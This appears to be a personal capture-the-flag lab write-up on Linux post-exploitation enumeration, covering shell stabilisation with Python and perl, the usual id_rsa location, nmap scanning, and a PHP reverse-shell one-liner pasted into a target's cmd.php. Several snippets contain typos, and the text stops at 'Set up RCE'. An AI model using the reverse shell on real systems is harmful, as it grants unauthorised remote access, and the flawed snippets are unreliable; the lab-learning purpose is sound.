Linux Local Enumerations
########################
:Author: David Boyd
:Date: 2020-11-10

[Task 1] Introduction
*********************

Have you ever found yourself in a situation where you have no idea about "what
to do after getting a reverse shell (access to a machine)"?
If your answer was "Yes", this room is definitely for you. This rooms aims at
providing beginner basis in box enumeration, giving a detailed approach towards
it.

Here's a list of units that are going to be covered in this room:

+------+-----------------------+----------------------------------------------+
| Unit | Title                 | Description                                  |
+======+=======================+==============================================+
| 1    | Stabilizing the shell | Exploring a way to transform a reverse shell |
|      |                       | into a stable bash or ssh shell.             |
+------+-----------------------+----------------------------------------------+
| 2    | Basic enumaration     | Enumerate OS and the most common files to    |
|      |                       | identify possible security flaws.            |
+------+-----------------------+----------------------------------------------+
| 3    | /etc                  | Understand the purpose and sensitivity of    |
|      |                       | files under /etc directory.                  |
+------+-----------------------+----------------------------------------------+
| 4    | Important files       | Learn to find files, containing potentially  |
|      |                       | valuable information.                        |
+------+-----------------------+----------------------------------------------+
| 6    | Enumeration scripts   | Automate the process by running multiple     |
|      |                       | community-created enumeration scripts.       |
+------+-----------------------+----------------------------------------------+

[Task 2] Unit 1 - tty
*********************

tty (text terminal)
	nc shells are fragile and delicate--so fix it by getting a normal shell.
	Commands like **su** and **sudo** require a proper terminal to run (ie tty)

Pythonic TTY

.. code-block:: Python

	# "Upgrade" your shell to TTY using Python
	python -c 'import pty;pyt.spawn("/bin/bash")'


`Upgrading Shells <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys>`_

1. How do you execute /bin/bash with perl?

Answer:

.. code-block:: Bash

	perl -e 'exec "bin/bash";'

Walkthrough: Hacky trial and error of perl one-liners!

[Task 3] Unit 1 - SSH
*********************

The 'id_rsa' defaults to the home/user/.ssh/id_rsa(.pub) location. Get that
file on your system and give it read-only permissions (chmod 600 id_rsa) and
connect by executing ssh -i id_rsa user@ip)

1. Where can you usually find the id_rsa file? (User = user)

Answer: /home/user/.ssh/id_rsa

2. Is there an id_rsa file on the bos (yay/nay)?

Answer: nay

[!THM] BREAK
************

It seems I need access now.  Let's break in.

1. Find open ports

.. code-block:: Bash

	nmap -T5 -A $TM
		> 3000/tcp open

2. Invesitgate those ports

Firefox > $TM:3000 > Copy php payload
	- (php -r '$sock=fsockopen("{IP}",{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'

Firefox > $TM:3000/cmd.php > Paste & edit IP,PORT

3. Set up RCE


